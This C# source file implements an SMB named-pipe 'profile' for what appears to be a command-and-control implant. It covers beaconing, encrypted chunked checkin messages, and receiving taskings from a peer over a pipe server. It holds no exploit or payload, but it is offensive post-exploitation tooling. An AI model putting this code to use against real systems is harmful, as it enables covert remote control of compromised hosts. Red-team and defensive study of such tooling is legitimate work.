using Agent.Interfaces;
using Agent.Utilities;
using System.Text.Json;
using Agent.Models;
using Agent.Profiles.Smb;
using System.Collections.Concurrent;
using System.Text;

using H.Pipes;
using H.Pipes.AccessControl;
using H.Pipes.Args;

namespace Agent.Profiles
{
    public class SmbProfile : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private string pipeName;
        private const int MaxPartialMessages = 128;
        private const int MaxCompletedMessages = 128;
        private const int MaxPartialMessageBytes = 1_048_576;
        private static readonly TimeSpan PartialMessageMaxAge = TimeSpan.FromMinutes(5);
        private static readonly TimeSpan CompletedMessageMaxAge = TimeSpan.FromMinutes(5);
        private readonly object partialMessagesLock = new();
        private ConcurrentDictionary<string, PartialMessage> partialMessages = new();
        private Dictionary<string, DateTimeOffset> completedMessages = new();
        private PipeServer<SmbMessage> serverPipe { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private static readonly TimeSpan CheckinResponseTimeout = TimeSpan.FromSeconds(30);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public SmbProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                SmbChannelOptionsJsonContext.Default.SmbChannelOptions)
                ?? throw new InvalidOperationException("Invalid SMB profile configuration");
            this.pipeName = opts.PipeName;

            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);

            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += async (sender, args) => await OnMessageReceive(args);
            this.serverPipe.StartAsync(this.cancellationTokenSource.Token);
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe
            await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for a bounded interval for a checkin response message.
            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
            {
                return new CheckinResponse { status = "failed" };
            }

            //We got a checkin response, so let's finish the checkin process
            this.checkedin = true;
            return this.cir;
        }

        private static Task<bool> WaitForCheckinResponse(
            ManualResetEventSlim signal,
            TimeSpan timeout,
            CancellationToken cancellationToken) =>
            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    try
                    {
                        await WaitWhileIdle(cancellationTokenSource.Token);
                    }
                    catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                    {
                        break;
                    }
                    continue;
                }

                try
                {
                    bool delivered = await messageManager.DeliverAsync(
                        this.Send,
                        result => result);
                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        private static Task WaitWhileIdle(CancellationToken cancellationToken)
        {
            return Task.Delay(100, cancellationToken);
        }

        internal async Task<bool> Send(string json)
        {
            if (!connected)
            {
                SmbConnectionWait.Wait(onClientConnectedSignal, cancellationTokenSource.Token);
            }

            try
            {
                json = this.crypt.Encrypt(json);
                SmbMessage sm = new SmbMessage()
                {
                    guid = Guid.NewGuid().ToString(),
                    final = false,
                    message_type = "chunked_message",
                    agent_guid = agentConfig.uuid,
                };

                string[] parts = json.SplitByLength(4000).ToArray();

                for (int index = 0; index < parts.Length; index++)
                {
                    sm.delegate_message = parts[index];
                    sm.final = index == parts.Length - 1;
                    await this.serverPipe.WriteAsync(sm);
                }

            }
            catch
            {
                this.connected = false;
                throw;
            }

            return true;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private async Task SendSuccess()
        {
            //Indicate the server that we're done processing the message and it can send the next one (if it's there)
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                message_type = "success",
                final = true,
                delegate_message = String.Empty,
                agent_guid = agentConfig.uuid,
            };

            await this.serverPipe.WriteAsync(sm);
        }

        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            //Event handler for new messages
            try
            {
                if (args.Message.message_type == "success")
                {
                    return;
                }

                if (TryAccumulateMessage(args.Message, DateTimeOffset.UtcNow, out string completeMessage))
                {
                    await OnMessageReceiveComplete(completeMessage);
                }

                await this.SendSuccess();
            }
            catch (Exception e)
            {
            }
        }

        private async Task OnClientConnection()
        {
            onClientConnectedSignal.Set();
            this.connected = true;
            await this.SendUpdate();
        }

        private async Task OnClientDisconnect()
        {
            this.connected = false;
            onClientConnectedSignal.Reset();
            lock (partialMessagesLock)
            {
                this.partialMessages.Clear();
            }
        }

        private bool TryAccumulateMessage(SmbMessage message, DateTimeOffset now, out string completeMessage)
        {
            completeMessage = string.Empty;
            if (string.IsNullOrWhiteSpace(message.guid) || message.delegate_message is null)
            {
                return false;
            }

            lock (partialMessagesLock)
            {
                foreach (var stale in partialMessages.Where(entry => now - entry.Value.UpdatedAt > PartialMessageMaxAge).ToArray())
                {
                    partialMessages.TryRemove(stale.Key, out _);
                }
                foreach (string completed in completedMessages.Where(entry => entry.Value <= now).Select(entry => entry.Key).ToArray())
                {
                    completedMessages.Remove(completed);
                }
                if (completedMessages.ContainsKey(message.guid))
                {
                    return false;
                }

                if (!partialMessages.TryGetValue(message.guid, out PartialMessage? partial))
                {
                    while (partialMessages.Count >= MaxPartialMessages)
                    {
                        RemoveOldestPartialMessage();
                    }
                    partial = new PartialMessage(now);
                    partialMessages[message.guid] = partial;
                }

                int incomingBytes = Encoding.UTF8.GetByteCount(message.delegate_message);
                int totalBytes = partialMessages.Values.Sum(entry => entry.ByteCount);
                while (totalBytes + incomingBytes > MaxPartialMessageBytes && partialMessages.Count > 1)
                {
                    totalBytes -= RemoveOldestPartialMessage(message.guid);
                }
                if (totalBytes + incomingBytes > MaxPartialMessageBytes)
                {
                    partialMessages.TryRemove(message.guid, out _);
                    return false;
                }

                partial.Content.Append(message.delegate_message);
                partial.ByteCount += incomingBytes;
                partial.UpdatedAt = now;
                if (!message.final)
                {
                    return false;
                }

                completeMessage = partial.Content.ToString();
                partialMessages.TryRemove(message.guid, out _);
                if (completedMessages.Count >= MaxCompletedMessages)
                {
                    completeMessage = string.Empty;
                    return false;
                }
                completedMessages[message.guid] = now.Add(CompletedMessageMaxAge);
                return true;
            }
        }

        private int RemoveOldestPartialMessage(string? except = null)
        {
            var oldest = partialMessages
                .Where(entry => entry.Key != except)
                .OrderBy(entry => entry.Value.UpdatedAt)
                .ThenBy(entry => entry.Key, StringComparer.Ordinal)
                .FirstOrDefault();
            if (string.IsNullOrEmpty(oldest.Key))
            {
                return 0;
            }
            partialMessages.TryRemove(oldest.Key, out PartialMessage? removed);
            return removed?.ByteCount ?? 0;
        }

        private Task OnMessageReceiveComplete(string message)
        {
            try
            {
                //If we haven't checked in yet, the only message this can really be is a checkin.
                if (!checkedin)
                {
                    CheckinResponse? response = JsonSerializer.Deserialize(this.crypt.Decrypt(message), CheckinResponseJsonContext.Default.CheckinResponse);
                    if (!CheckinResponseValidation.IsSuccessful(response))
                    {
                        return Task.CompletedTask;
                    }

                    cir = response;
                    checkinAvailable.Set();
                    return Task.CompletedTask;
                }

                //If we make it to here, it's a tasking response
                GetTaskingResponse? gtr = JsonSerializer.Deserialize(this.crypt.Decrypt(message), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr?.action == "get_tasking")
                {
                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                    this.SetTaskingReceived?.Invoke(this, tra);
                }
            }
            catch
            {
                // Peer-controlled ciphertext and JSON must not escape the receive callback.
            }
            return Task.CompletedTask;
        }
        private async Task SendUpdate()
        {
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                final = true,
                message_type = "success",
                delegate_message = "",
                agent_guid = this.agentConfig.uuid
            };

            await this.serverPipe.WriteAsync(sm);
        }

        private sealed class PartialMessage
        {
            public StringBuilder Content { get; } = new();
            public int ByteCount { get; set; }
            public DateTimeOffset UpdatedAt { get; set; }

            public PartialMessage(DateTimeOffset updatedAt)
            {
                UpdatedAt = updatedAt;
            }
        }
    }
}
